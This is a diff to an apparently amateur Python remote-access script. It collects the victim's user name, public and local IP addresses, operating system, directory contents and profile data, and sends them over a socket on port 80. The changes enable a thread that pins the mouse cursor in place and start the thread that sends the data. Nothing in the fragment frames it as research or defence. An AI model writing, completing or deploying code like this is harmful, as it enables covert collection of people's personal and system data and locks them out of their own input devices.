@@ -1,4 +1,3 @@
-import subprocess
 import mouse
 import socket
 from sys import platform, api_version, getprofile
@@ -20,7 +19,7 @@ white = "\033[97;1m"
 blink = "\033[5m"
 # END OF FARVER
 
-HOST = "192.168.68.104"
+HOST = "" # your local ip address
 PORT = 80
 BUFFER = 1024*3
 
@@ -54,8 +53,8 @@ def listen_for_host(host,port):
     try:
         conn, ip = sock.accept()
     except:
-        print(f"[+] couldnt recive the connection!")
-    print(f"[+] Connection recived from UNKNOWN...")
+        print(f"[+] couldnt recive the connection...")
+    print(f"[+] Connection recived!")
     msg =   f"\
             user: {info_list[0]}\n\
             public ip: {info_list[1]}\n\
@@ -83,12 +82,11 @@ def get_os_info():
     dir_content = listdir()
     profiles = getprofile()
     api = api_version
-
     all = user, public_ip, local_ip, operating_system, dir_content, profiles, api
 
     for i in all:
         info_list.append(i)
 
 
-# lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,10000000000)).start()
-print_numbers_forever_ = threading.Thread(target=listen_for_host(HOST,PORT)).start()
+lock_mouse_pos = threading.Thread(target=lock_mouse(0,0,100000)).start()
+send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT)).start()
